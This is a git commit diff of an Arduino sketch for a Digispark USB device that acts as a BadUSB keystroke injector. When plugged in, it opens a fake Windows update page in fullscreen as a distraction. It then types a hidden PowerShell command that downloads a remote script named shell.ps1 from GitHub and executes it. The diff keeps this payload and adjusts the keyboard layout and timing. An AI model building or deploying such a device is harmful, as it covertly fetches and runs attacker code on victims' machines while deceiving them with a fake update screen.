15f43732339c3e734222b3aa9a186f91b12269bc
Ricardo Araujo <60905493+araujoricardo@users.noreply.github.com>
2022-12-08 21:24:29 -0300

    Update code_tcc.ino

--- code_tcc.ino
+++ code_tcc.ino
@@ -1,28 +1,33 @@
+#include "DigiKeyboardPtBr.h"
 #include "DigiKeyboard.h"
 
+#define keyboard DigiKeyboardPtBr
+
 void setup() {
-  // put your setup code here, to run once:
+    // put your setup code here, to run once:
+   keyboard.delay(3000);
 }
 
 void loop() {
   // put your main code here, to run repeatedly:
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(600);
-  DigiKeyboard.print("https://fakeupdate.net/win10ue/");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(600);
-  DigiKeyboard.sendKeyStroke(KEY_F11);
-  DigiKeyboard.delay(500);  
+  keyboard.sendKeyStroke(0);
+  keyboard.delay(500);
+  
+  keyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  keyboard.delay(600);
+  keyboard.print("https://fakeupdate.net/win10ue/");
+  keyboard.sendKeyStroke(KEY_ENTER);
+  keyboard.delay(1000);
+  keyboard.sendKeyStroke(KEY_F11);
+  keyboard.delay(3000);
 
-  DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell");
-  DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.println("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/araujoricardo/Digispark/main/shell.ps1');");  
+  keyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
+  keyboard.delay(3000);
+  keyboard.print("powershell");
+  keyboard.delay(500);
+  keyboard.sendKeyStroke(KEY_ENTER);
+  keyboard.delay(3000);
+  keyboard.println("powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/araujoricardo/Digispark/main/shell.ps1');");  
 
   for(;;){ /*empty*/ }
 }
